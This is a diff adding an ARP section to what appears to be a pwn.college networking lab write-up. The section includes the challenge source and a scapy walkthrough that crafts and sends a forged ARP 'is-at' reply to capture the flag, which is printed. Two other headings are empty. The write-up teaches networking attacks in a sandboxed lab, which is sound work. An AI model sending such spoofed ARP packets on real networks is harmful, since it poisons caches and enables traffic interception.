@@ -1696,3 +1696,129 @@ network.run()
 user_host.interactive(environ=parent_process.environ())
 ```
 
+&nbsp;
+
+## UDP Spoofing 4
+
+&nbsp;
+
+## ARP
+
+> Manually send an Address Resolution Protocol packet. The packet should inform the remote host that the IP address `10.0.0.42` can be found at the Ethernet address `42:42:42:42:42:42`. The packet should be sent to the remote host at `10.0.0.2`.
+
+### Source code
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import os
+
+import psutil
+import scapy.all as scapy
+from dojjail import Host, Network
+
+WHO_HAS = 1
+IS_AT = 2
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class RawPacketHost(Host):
+    def entrypoint(self):
+        scapy.conf.ifaces.reload()
+        scapy.sniff(prn=self.handle_packet, iface="eth0")
+
+    def handle_packet(self, packet):
+        if "ARP" not in packet:
+            return
+        if (packet["ARP"].psrc == "10.0.0.42" and packet["ARP"].hwsrc == "42:42:42:42:42:42" and
+            packet["ARP"].op == IS_AT):
+            print(flag, flush=True)
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+raw_packet_host = RawPacketHost("ip-10-0-0-2")
+network = Network(hosts={user_host: "10.0.0.1", raw_packet_host: "10.0.0.2"}, subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(environ=parent_process.environ())
+```
+
+```
+root@ip-10-0-0-1:/# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
+        inet6 fe80::9c52:48ff:fe85:bab6  prefixlen 64  scopeid 0x20<link>
+        ether 9e:52:48:85:ba:b6  txqueuelen 1000  (Ethernet)
+        RX packets 18  bytes 1556 (1.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5  bytes 426 (426.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+We need to tell the host at `10.0.0.2` that we have the IP address that they want to talk to. For that we need to send an ARP `is-at` response.
+
+Note that ARP encapsulates an Ethernet frame.
+
+```py
+>>> ARP().display()
+WARNING: No route found for IPv4 destination 0.0.0.0 (no default route?)
+WARNING: No route found for IPv4 destination 0.0.0.0 (no default route?)
+###[ ARP ]###
+  hwtype    = Ethernet (10Mb)
+  ptype     = IPv4
+  hwlen     = None
+  plen      = None
+  op        = who-has
+  hwsrc     = 00:00:00:00:00:00
+  psrc      = 0.0.0.0
+  hwdst     = 00:00:00:00:00:00
+  pdst      = 0.0.0.0
+```
+
+The packet fields represent the following:
+- `hwsrc`: Source hardware address. This will be updated in the target's ARP table.
+- `psrc`: The IP to be added in the target's ARP table.
+- `hwdst`: Destination hardware address.
+- `pdst`: Destination where the ARP packet must go.
+
+```py
+>>> (Ether(src="9e:52:48:85:ba:b6", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", hwsrc="42:42:42:42:42:42", psrc="10.0.0.42", hwdst="ff:ff:ff:ff:ff:ff", pdst="10.0.0.2")).display()
+###[ Ethernet ]###
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = 9e:52:48:85:ba:b6
+  type      = ARP
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = is-at
+     hwsrc     = 42:42:42:42:42:42
+     psrc      = 10.0.0.42
+     hwdst     = ff:ff:ff:ff:ff:ff
+     pdst      = 10.0.0.2
+```
+
+```py
+>>> sendp(Ether(src="9e:52:48:85:ba:b6", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", hwsrc="42:42:42:42:42:42", psrc="10.0.0.42", hwdst="ff:ff:ff:ff:ff:ff", pdst="10.0.0.2"), iface="eth0")
+.
+Sent 1 packets.
+pwn.college{wP575ocvtjd1WArdmPDG-QiQlAy.dBzNzMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Intercept
+
+### Source code
+```py title="/challenge/run" showLineNumbers
+
+```
